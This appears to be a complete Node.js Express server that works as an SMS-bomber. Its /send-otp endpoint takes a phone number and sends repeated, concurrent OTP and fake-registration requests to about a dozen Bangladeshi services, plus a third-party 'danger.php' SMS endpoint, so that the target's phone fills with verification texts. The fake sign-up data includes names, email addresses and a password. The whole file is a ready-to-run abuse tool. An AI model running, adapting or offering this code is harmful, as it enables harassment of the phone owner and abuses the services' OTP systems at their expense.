const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('API is running');
});

app.get('/send-otp', async (req, res) => {
  const number = req.query.number;
  if (!number) {
    return res.status(400).json({ error: 'No number provided' });
  }

  const numberWithCode = number.startsWith('0') ? '+880' + number.slice(1) : number;

  const apis = [
    { name: 'RabbitHoleBD', method: 'post', url: 'https://apix.rabbitholebd.com/appv2/login/requestOTP', data: { mobile: numberWithCode }, headers: { 'Content-Type': 'application/json' }, repeat: 2 },
    { name: 'Osudpotro', method: 'post', url: 'https://api.osudpotro.com/api/v1/users/send_otp', data: { phone: number }, headers: { 'Content-Type': 'application/json' }, repeat: 2 },
    { name: 'SwapBD', method: 'post', url: 'https://api.swap.com.bd/api/v1/send-otp', data: { phone_number: number }, headers: { 'Content-Type': 'application/json' }, repeat: 2 },
    { name: 'RangsEcom', method: 'post', url: 'https://ecom.rangs.com.bd/send-otp-code', data: { mobile: numberWithCode }, headers: { 'Content-Type': 'application/json' }, repeat: 2 },
    { name: 'BlackTeam', method: 'get', url: `http://Black-Team.xyz/sms/danger.php?phone=${number}`, repeat: 2 },
    { name: 'DeepToPlay', method: 'post', url: 'https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web', data: { number: number }, headers: { 'Content-Type': 'application/json' }, repeat: 2 },
    { name: 'Paperfly', method: 'post', url: 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', data: { full_name: 'Hangama', company_name: 'Hangama', email_address: 'hangama@gmail.com', phone_number: number }, headers: { 'Content-Type': 'application/json' }, repeat: 2 },
    { name: 'GrameenphoneBKShop', method: 'post', url: 'https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp', data: { phone: number, email: 'kallueas@gmail.com', language: 'en' }, headers: { 'Content-Type': 'application/json' }, repeat: 2 },
    { name: 'EasyComBd', method: 'post', url: 'https://core.easy.com.bd/api/v1/registration', data: { name: 'Shahidul Islam', email: 'uyrlhkgxqw@emergentvillage.org', mobile: number, password: 'boss#2022', password_confirmation: 'boss#2022', device_key: '9a28ae67c5704e1fcb50a8fc4ghjea4d' }, headers: { 'Content-Type': 'application/json' }, repeat: 2 },
    { name: 'RedX', method: 'post', url: 'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', data: { phoneNumber: number }, headers: { 'Content-Type': 'application/json' }, repeat: 2 },
    { name: 'Bikroy', method: 'get', url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${number}`, repeat: 2 },
    { name: 'Cinematic', method: 'post', url: `https://api.mygp.cinematic.mobi/api/v1/send-common-otp/880${number.slice(1)}/`, headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0', 'Content-Type': 'application/json' }, repeat: 4 }
  ];

  let successCount = 0;

  // Prepare all requests concurrently
  const requests = [];

  apis.forEach(api => {
    for (let i = 0; i < api.repeat; i++) {
      if (api.method === 'post') {
        requests.push(
          axios.post(api.url, api.data || {}, { headers: api.headers || {} })
            .then(() => { successCount++; })
            .catch(() => { /* ignore errors */ })
        );
      } else if (api.method === 'get') {
        requests.push(
          axios.get(api.url, { headers: api.headers || {} })
            .then(() => { successCount++; })
            .catch(() => { /* ignore errors */ })
        );
      }
    }
  });

  await Promise.all(requests);

  res.json({ success_requests: successCount });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});